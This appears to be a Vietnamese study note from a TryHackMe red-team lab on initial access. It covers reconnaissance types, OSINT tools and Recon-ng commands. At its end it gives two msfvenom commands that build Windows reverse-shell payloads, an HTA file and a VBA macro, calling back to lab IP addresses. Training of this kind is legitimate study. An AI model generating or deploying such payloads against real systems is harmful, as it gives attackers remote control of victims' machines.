---
template: overrides/blog.html
icon: material/plus-circle
title: Init Access
description: >
  
search:
  exclude: true
hide:
  - feedback

links:
  - setup/setting-up-site-search.md#built-in-search-plugin
  - insiders/index.md#how-to-become-a-sponsor
tags:
  - THM-Init Access 
---

# __Init Access__

---

Có một câu nói rất hay "Biết người biết ta, trăm trận trăm thắng". Đầu tiên khi ta bước vào giai đoạn tấn công một thứ gì đó thì việc hiểu về nó thực sự cần thiết. Bạn có thể tham khảo một vài kĩ thuật do thám từ vị trí của Redteam như sau:


Types of reconnaissance activities
WHOIS and DNS-based reconnaissance
Advanced searching
Searching by image
Google Hacking
Specialized search engines
Recon-ng
Maltego

## __Types of reconnaissance activities (các loại trinh sát)__

Trinh sát có thể chia làm 2 loại:

1. Trinh sát bị động: Có thể thực hiện bằng việc quan sát những gì có sẵn ở mục tiêu hoặc ở bên thứ ba cung cấp (dùng các kĩ thuật như OSINT để thu thập thông tin, ... whois, nslookup, dig, shodan.io, DNSDumpster,...)
2. Trinh sát chủ động: Cần chủ động, tương tác với mục tiêu nhằm xem phản ứng của nó (các công cụ được dùng như netcat, ping, traceroute, telnet, ...). Trong trinh sát chủ động, có thể chia làm 2 nhánh tiếp cận sau:

- Trinh sát từ bên ngoài: Được tiến hành trinh sát từ bên ngoài mạng nội bộ của mục tiêu.
- Trinh sát từ bên trong: Được tiến hành trinh sát từ bên trong mạng nội bộ của mục tiêu 



---

Recon-ng là một framework giúp tự động hóa công việc OSINT. Nó sử dụng các mô-đun từ nhiều tác giả khác nhau và cung cấp vô số chức năng. Một số mô-đun yêu cầu các phím để hoạt động; khóa cho phép mô-đun truy vấn API trực tuyến có liên quan. Trong nhiệm vụ này, chúng tôi sẽ minh họa bằng cách sử dụng Recon-ng trong thiết bị đầu cuối.


marketplace search KEYWORDđể tìm kiếm các mô-đun có sẵn với từ khóa .
marketplace info MODULEđể cung cấp thông tin về mô-đun được đề cập.
marketplace install MODULEđể cài đặt mô-đun được chỉ định vào Recon-ng.
marketplace remove MODULEđể gỡ cài đặt mô-đun được chỉ định.

tra ip ngược: https://viewdns.info/

https://search.censys.io/


https://www.google.com/advanced_search


reverse shell for window: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta


reverse shell for window with vba: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.18.80.57 LPORT=443 -f vba 